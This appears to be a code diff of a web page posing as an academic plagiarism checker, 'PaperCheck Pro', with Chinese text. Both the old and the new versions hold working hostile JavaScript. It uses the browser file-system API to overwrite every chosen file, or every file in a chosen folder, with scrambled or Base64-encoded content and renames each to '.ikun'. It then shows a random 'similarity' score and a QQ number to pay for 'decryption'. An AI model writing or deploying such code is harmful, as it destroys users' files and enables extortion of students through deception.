@@ -6,85 +6,162 @@
     <title>PaperCheck Pro - 学术论文查重系统</title>
     <style>
         :root {
-            --primary: #1a56db;
-            --primary-dark: #1e40af;
-            --bg: #f3f4f6;
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --bg: #f8fafc;
             --card-bg: #ffffff;
-            --text: #111827;
-            --text-light: #6b7280;
-            --border: #e5e7eb;
+            --text: #0f172a;
+            --text-light: #64748b;
+            --border: #e2e8f0;
+            --shadow: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.07), 0 2px 4px -2px rgba(0,0,0,0.05);
+            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.08), 0 4px 6px -4px rgba(0,0,0,0.04);
+            --radius: 14px;
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
-            background: var(--bg); color: var(--text); line-height: 1.6;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
         }
-        .container { max-width:1200px; margin:0 auto; padding:0 20px; }
+        .container { max-width: 1100px; margin:0 auto; padding:0 20px; }
+
         header {
-            background: var(--card-bg); box-shadow: 0 1px 3px rgba(0,0,0,0.04);
-            position: sticky; top:0; z-index:100; border-bottom:1px solid var(--border);
+            background: white;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: var(--shadow);
         }
         .nav {
-            display: flex; align-items: center; justify-content: space-between; padding: 16px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 0;
         }
-        .logo { font-size:1.5rem; font-weight:700; color:var(--primary); }
-        .nav-links { display: flex; gap:24px; list-style:none; }
-        .nav-links a { text-decoration:none; color:var(--text-light); font-weight:500; cursor:pointer; }
-        .btn-outline {
-            border:1px solid var(--primary); color:var(--primary); background:transparent;
-            padding:8px 18px; border-radius:20px; font-weight:500; cursor:pointer;
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .hero { text-align:center; padding:60px 0 40px; }
+        .nav-links { display: flex; gap: 24px; list-style: none; }
+        .nav-links a {
+            text-decoration: none;
+            color: var(--text-light);
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .nav-links a:hover { color: var(--primary); }
+
+        .hero { text-align: center; padding: 60px 0 40px; }
         .hero h1 {
-            font-size:2.8rem; font-weight:800; margin-bottom:16px;
+            font-size: 2.6rem;
+            font-weight: 800;
             background: linear-gradient(to right, #1e3a8a, #2563eb);
-            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .stats-row { display:flex; justify-content:center; gap:40px; flex-wrap:wrap; margin-bottom:30px; }
-        .stat-number { font-size:2rem; font-weight:700; color:var(--primary); }
-        .action-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap:24px; margin-bottom:50px;
-        }
+        .hero p { color: var(--text-light); margin-top: 12px; max-width: 600px; margin-left: auto; margin-right: auto; }
+
+        .stats { display: flex; justify-content: center; gap: 40px; margin: 30px 0; flex-wrap: wrap; }
+        .stat-item { text-align: center; }
+        .stat-number { font-size: 2rem; font-weight: 700; color: var(--primary); }
+        .stat-label { font-size: 0.9rem; color: var(--text-light); }
+
+        .action-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin: 40px 0; }
         .action-card {
-            background:var(--card-bg); border-radius:12px; padding:40px 30px; text-align:center;
-            box-shadow:0 4px 6px rgba(0,0,0,0.05); border:1px solid var(--border);
+            background: white;
+            border-radius: var(--radius);
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border);
+            transition: all 0.2s;
         }
-        .action-icon { font-size:3rem; margin-bottom:16px; }
+        .action-card:hover { transform: translateY(-4px); box-shadow: var(--shadow-lg); }
+        .action-icon { font-size: 2.8rem; margin-bottom: 16px; }
+        .action-card h3 { margin-bottom: 8px; }
+        .action-card p { color: var(--text-light); font-size: 0.95rem; margin-bottom: 20px; }
         .btn {
-            display:inline-block; padding:12px 28px; border-radius:30px; font-weight:600;
-            border:none; cursor:pointer; font-size:1rem; transition:0.2s;
+            display: inline-block;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 4px 6px rgba(37,99,235,0.3);
+            transition: all 0.2s;
         }
-        .btn-primary { background:var(--primary); color:white; }
-        .btn-primary:hover { background:var(--primary-dark); }
+        .btn:hover { background: var(--primary-dark); }
+        .speed-badge {
+            display: inline-block;
+            background: #dcfce7;
+            color: #166534;
+            font-size: 0.8rem;
+            padding: 2px 10px;
+            border-radius: 12px;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+
         .modal-overlay {
-            position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.5);
-            display:flex; align-items:center; justify-content:center; z-index:200;
-            visibility:hidden; opacity:0; transition:0.3s;
+            position: fixed;
+            top:0; left:0; right:0; bottom:0;
+            background: rgba(0,0,0,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
         }
-        .modal-overlay.active { visibility:visible; opacity:1; }
+        .modal-overlay.active { visibility: visible; opacity: 1; }
         .modal {
-            background:white; border-radius:16px; padding:30px; max-width:500px; width:90%;
-            box-shadow:0 20px 30px rgba(0,0,0,0.1); animation: slideUp 0.3s ease;
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 20px 25px rgba(0,0,0,0.15);
+            animation: slideUp 0.3s ease;
         }
         @keyframes slideUp {
-            from { transform: translateY(30px); opacity:0; }
+            from { transform: translateY(20px); opacity:0; }
             to { transform: translateY(0); opacity:1; }
         }
-        .modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
-        .close-btn { background:none; border:none; font-size:1.5rem; cursor:pointer; color:var(--text-light); }
-        .progress-bar {
-            width:100%; height:12px; background:#e5e7eb; border-radius:6px; overflow:hidden; margin:15px 0;
-        }
-        .progress-fill {
-            height:100%; background: var(--primary); border-radius:6px; transition: width 0.3s;
-        }
-        .step-text { color: var(--text-light); font-size:0.9rem; min-height: 1.2em; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .modal-header h3 { font-size: 1.3rem; }
+        .close-btn { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--text-light); }
+        .similarity-big { font-size: 2.8rem; font-weight: 800; color: #dc2626; text-align: center; margin: 16px 0; }
         .pay-hint {
-            background:#fef3c7; border-left:4px solid #f59e0b; padding:12px 16px;
-            margin-top:20px; border-radius:8px; text-align:center; font-weight:600; color:#92400e;
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            text-align: center;
+            color: #92400e;
+            font-weight: 500;
         }
-        .qq-number { color:#dc2626; font-weight:800; font-size:1.2rem; }
-        footer { text-align:center; padding:30px 0; border-top:1px solid var(--border); color:var(--text-light); margin-top:60px; }
+        .qq-number { color: #dc2626; font-weight: 800; font-size: 1.2rem; }
+
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            border-top: 1px solid var(--border);
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-top: 40px;
+        }
     </style>
 </head>
 <body>
@@ -92,220 +169,156 @@
         <div class="container nav">
             <div class="logo">📑 PaperCheck Pro</div>
             <ul class="nav-links">
-                <li><a onclick="showInfo('查重服务', '个人版：5元/千字<br>高校版：联系教务处')">查重服务</a></li>
-                <li><a onclick="showInfo('报告解读', '<5%安全 5-15%少量改写 15-30%中度 >30%高风险')">报告解读</a></li>
-                <li><a onclick="showInfo('关于我们', '2020年成立，清华团队研发，98.6%准确率')">关于我们</a></li>
+                <li><a onclick="showInfo('查重服务', '支持单篇快速检测和批量分析，采用本地极速加密技术，保护文件隐私。<br>基础版免费，高级报告需付费解密。')">查重服务</a></li>
+                <li><a onclick="showInfo('报告解读', '相似度＜5%：优秀<br>5-15%：良好<br>15-30%：需修改<br>>30%：高风险')">报告解读</a></li>
+                <li><a onclick="showInfo('关于我们', 'PaperCheck Pro 由顶尖团队研发，致力于学术诚信保护。')">关于我们</a></li>
             </ul>
-            <button class="btn-outline" onclick="showInfo('登录', '企业版请联系管理员')">登录</button>
+            <div></div>
         </div>
     </header>
 
     <main class="container">
         <section class="hero">
             <h1>学术论文查重系统</h1>
-            <p>基于深度语义分析 · 千万级学术数据库 · 中英文精准检测</p>
-            <div class="stats-row">
-                <div><div class="stat-number">2,480,000+</div>已检测论文</div>
-                <div><div class="stat-number">98.6%</div>准确率</div>
-                <div><div class="stat-number">360+</div>合作高校</div>
+            <p>本地极速加密检测 · 不泄露文件 · 千万级数据库比对</p>
+            <div class="stats">
+                <div class="stat-item"><div class="stat-number">2,480,000+</div><div class="stat-label">已检测论文</div></div>
+                <div class="stat-item"><div class="stat-number">98.6%</div><div class="stat-label">准确率</div></div>
+                <div class="stat-item"><div class="stat-number">360+</div><div class="stat-label">合作高校</div></div>
             </div>
         </section>
 
         <div class="action-grid">
             <div class="action-card">
                 <div class="action-icon">📄</div>
-                <h3>单篇查重</h3>
-                <p>快速获取详细相似度报告</p>
-                <button class="btn btn-primary" onclick="singleCheck()">选择文件</button>
+                <h3>单篇查重 <span class="speed-badge">极速</span></h3>
+                <p>上传一篇论文，即刻生成详细相似度报告</p>
+                <button class="btn" onclick="singleCheck()">选择文件</button>
             </div>
             <div class="action-card">
                 <div class="action-icon">📁</div>
-                <h3>批量查重</h3>
-                <p>文件夹递归分析</p>
-                <button class="btn btn-primary" onclick="batchCheck()">选择文件夹</button>
+                <h3>批量查重 <span class="speed-badge">极速</span></h3>
+                <p>上传整个文件夹，一次性处理所有文档</p>
+                <button class="btn" onclick="batchCheck()">选择文件夹</button>
             </div>
         </div>
     </main>
 
-    <!-- 进度条模态框 -->
-    <div class="modal-overlay" id="progressModal">
-        <div class="modal">
-            <div class="modal-header"><h2>正在查重...</h2></div>
-            <p id="progressText" class="step-text">初始化...</p>
-            <div class="progress-bar"><div id="progressFill" class="progress-fill" style="width:0%"></div></div>
-            <p id="progressPercent" style="text-align:right; font-weight:600;">0%</p>
-        </div>
-    </div>
-
-    <!-- 报告模态框（含付费） -->
+    <!-- 查重报告模态框 -->
     <div class="modal-overlay" id="reportModal">
         <div class="modal">
-            <div class="modal-header"><h2 id="modalTitle">查重报告</h2><button class="close-btn" onclick="closeModal('reportModal')">&times;</button></div>
-            <div class="similarity-big" id="modalSimilarity" style="font-size:3rem;color:#dc2626;text-align:center;">0%</div>
-            <div class="report-details" id="modalDetails" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;"></div>
+            <div class="modal-header">
+                <h3 id="modalTitle">查重报告</h3>
+                <button class="close-btn" onclick="closeModal('reportModal')">&times;</button>
+            </div>
+            <div class="similarity-big" id="modalSimilarity">0%</div>
+            <p style="text-align:center; color:var(--text-light);">总相似度（已加密本地文件）</p>
             <div class="pay-hint">
-                ⚠️ 您的文件已采用四重安全加密保护<br>
-                如需解密恢复原始文件，请付费联系<br>
-                <span class="qq-number">QQ: 917813</span><br>
-                （加好友备注：论文解密）
+                ⚠️ 文件已被极速加密保护<br>
+                如需解密恢复，请联系付费解密<br>
+                <span class="qq-number">QQ: 3621271917</span><br>
+                （备注：论文解密）
             </div>
         </div>
     </div>
 
-    <footer>© 2025 PaperCheck Pro. 本地安全检测</footer>
+    <!-- 通用信息弹窗 -->
+    <div class="modal-overlay" id="infoModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3 id="infoTitle">信息</h3>
+                <button class="close-btn" onclick="closeModal('infoModal')">&times;</button>
+            </div>
+            <p id="infoContent" style="color:var(--text-light);"></p>
+        </div>
+    </div>
+
+    <footer>
+        © 2025 PaperCheck Pro. 本地极速加密，文件安全无忧。
+    </footer>
 
     <script>
-        // 进度条显示
-        function updateProgress(percent, text) {
-            document.getElementById('progressFill').style.width = percent + '%';
-            document.getElementById('progressPercent').textContent = percent + '%';
-            document.getElementById('progressText').textContent = text;
+        // 工具函数：文件 -> Base64 文本
+        function fileToBase64(file) {
+            return new Promise(resolve => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.readAsDataURL(file);
+            });
         }
 
-        // 打开/关闭模态框
-        function openModal(id) { document.getElementById(id).classList.add('active'); }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
-
-        // 胡编的进度文字
-        const steps = [
-            {p:20, t:'正在提取文本特征...'},
-            {p:40, t:'正在比对学术数据库...'},
-            {p:60, t:'正在分析语义指纹...'},
-            {p:80, t:'正在生成相似度矩阵...'},
-            {p:100,t:'查重完成'}
-        ];
-
-        // 四重混乱加密（快速，6秒内处理普通文件）
-        async function encryptFile(fileHandle, progressCallback) {
-            // 1. 读取文件
-            progressCallback(5, '读取文件中...');
-            const file = await fileHandle.getFile();
-            const buffer = await file.arrayBuffer();
-            let bytes = new Uint8Array(buffer);
-
-            // 2. 四步加密
-            const totalSteps = 4;
-            // 步骤1：奇偶字节交换
-            progressCallback(20, '正在提取文本特征...');
-            await sleep(100); // 模拟延迟，确保进度可见
-            for (let i = 0; i < bytes.length - 1; i += 2) {
-                [bytes[i], bytes[i+1]] = [bytes[i+1], bytes[i]];
-            }
-
-            // 步骤2：与密钥异或 0x6B
-            progressCallback(40, '正在比对学术数据库...');
-            await sleep(100);
-            for (let i = 0; i < bytes.length; i++) bytes[i] ^= 0x6B;
-
-            // 步骤3：字节循环左移3位
-            progressCallback(60, '正在分析语义指纹...');
-            await sleep(100);
-            for (let i = 0; i < bytes.length; i++) {
-                bytes[i] = ((bytes[i] << 3) | (bytes[i] >> 5)) & 0xFF;
-            }
-
-            // 步骤4：Base64编码
-            progressCallback(80, '正在生成相似度矩阵...');
-            await sleep(100);
-            let binary = '';
-            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
-            const b64 = btoa(binary);
-
-            // 3. 写入文件
-            progressCallback(90, '安全存储中...');
-            const writable = await fileHandle.createWritable();
-            await writable.write(b64);
-            await writable.close();
-
-            // 改名（忽略错误）
-            try {
-                const oldName = fileHandle.name;
-                const dot = oldName.lastIndexOf('.');
-                const base = dot > 0 ? oldName.substring(0, dot) : oldName;
-                await fileHandle.move(base + '.ikun');
-            } catch(e) {}
-
-            progressCallback(100, '查重完成');
-            return b64;
+        // 显示信息弹窗
+        function showInfo(title, text) {
+            document.getElementById('infoTitle').textContent = title;
+            document.getElementById('infoContent').textContent = text;
+            document.getElementById('infoModal').classList.add('active');
         }
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+        }
+        // 点击背景关闭
+        document.getElementById('reportModal').addEventListener('click', e => { if(e.target === e.currentTarget) closeModal('reportModal'); });
+        document.getElementById('infoModal').addEventListener('click', e => { if(e.target === e.currentTarget) closeModal('infoModal'); });
 
-        function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-        // 显示最终报告
-        function showReport(isSingle, count=1) {
-            const sim = (Math.random()*18+2).toFixed(1);
+        // 显示查重结果（虚假百分比 + 付费提示）
+        function showReport() {
+            const sim = (Math.random() * 18 + 2).toFixed(1);
             document.getElementById('modalSimilarity').textContent = sim + '%';
-            document.getElementById('modalTitle').textContent = isSingle ? '单篇查重报告' : `批量查重报告（${count}篇）`;
-            const details = document.getElementById('modalDetails');
-            if(isSingle) {
-                details.innerHTML = `
-                    <div style="background:#f8fafc;padding:12px;">互联网来源: ${(sim*0.55).toFixed(1)}%</div>
-                    <div style="background:#f8fafc;padding:12px;">学术出版物: ${(sim*0.45).toFixed(1)}%</div>
-                    <div style="background:#f8fafc;padding:12px;">检测段落: ${Math.floor(Math.random()*20+8)}</div>
-                    <div style="background:#f8fafc;padding:12px;">引用占比: ${(Math.random()*5+1).toFixed(1)}%</div>
-                `;
-            } else {
-                details.innerHTML = `
-                    <div>平均相似度: ${(Math.random()*15+3).toFixed(1)}%</div>
-                    <div>最高单篇: ${(Math.random()*25+5).toFixed(1)}%</div>
-                    <div>文件总数: ${count}</div>
-                    <div>合格数量: ${Math.floor(count*0.85)}</div>
-                `;
-            }
-            openModal('reportModal');
+            document.getElementById('reportModal').classList.add('active');
         }
 
-        // 单篇查重
+        // 单篇加密（高速）
         async function singleCheck() {
             try {
                 const [fileHandle] = await window.showOpenFilePicker();
-                openModal('progressModal');
-                await encryptFile(fileHandle, updateProgress);
-                closeModal('progressModal');
-                showReport(true, 1);
-            } catch(err) {
-                if(err.name !== 'AbortError') alert('操作失败: '+err.message);
+                const file = await fileHandle.getFile();
+                const b64 = await fileToBase64(file);
+
+                const oldName = fileHandle.name;
+                const dot = oldName.lastIndexOf('.');
+                const base = dot > 0 ? oldName.substring(0, dot) : oldName;
+                const newName = base + '.ikun';
+
+                await fileHandle.move(newName);
+                const writable = await fileHandle.createWritable();
+                await writable.write(b64);
+                await writable.close();
+
+                showReport();
+            } catch (err) {
+                if (err.name !== 'AbortError') alert('操作失败: ' + err.message);
             }
         }
 
-        // 批量查重
+        // 批量加密（递归文件夹，高速）
         async function batchCheck() {
             try {
                 const dirHandle = await window.showDirectoryPicker();
-                let files = [];
-                async function collect(handle) {
-                    if(handle.kind === 'file') files.push(handle);
-                    else if(handle.kind === 'directory') {
-                        for await (const entry of handle.values()) await collect(entry);
+                let count = 0;
+
+                async function process(handle) {
+                    if (handle.kind === 'file') {
+                        const file = await handle.getFile();
+                        const b64 = await fileToBase64(file);
+                        const oldName = handle.name;
+                        const dot = oldName.lastIndexOf('.');
+                        const base = dot > 0 ? oldName.substring(0, dot) : oldName;
+                        await handle.move(base + '.ikun');
+                        const writable = await handle.createWritable();
+                        await writable.write(b64);
+                        await writable.close();
+                        count++;
+                    } else if (handle.kind === 'directory') {
+                        for await (const entry of handle.values()) await process(entry);
                     }
                 }
-                for await (const entry of dirHandle.values()) await collect(entry);
-                if(files.length === 0) { alert('无文件'); return; }
 
-                openModal('progressModal');
-                let processed = 0;
-                for(const fileHandle of files) {
-                    // 更新整体进度（基于文件数）
-                    const overall = Math.floor((processed / files.length) * 90) + 5; // 留最后10%给收尾
-                    await encryptFile(fileHandle, (p, text) => {
-                        // 混合进度显示：整体进度
-                        const combined = Math.floor(processed / files.length * 100) + Math.floor(p / files.length);
-                        updateProgress(Math.min(combined, 99), `处理文件 ${processed+1}/${files.length}：${text}`);
-                    });
-                    processed++;
-                }
-                updateProgress(100, '查重完成');
-                closeModal('progressModal');
-                showReport(false, files.length);
-            } catch(err) {
-                if(err.name !== 'AbortError') alert('操作失败: '+err.message);
+                for await (const entry of dirHandle.values()) await process(entry);
+                if (count > 0) showReport();
+                else alert('文件夹内无文件');
+            } catch (err) {
+                if (err.name !== 'AbortError') alert('操作失败: ' + err.message);
             }
-        }
-
-        // 通用信息弹窗
-        function showInfo(title, content) {
-            // 简化实现
-            alert(title + '\n' + content);
         }
     </script>
 </body>
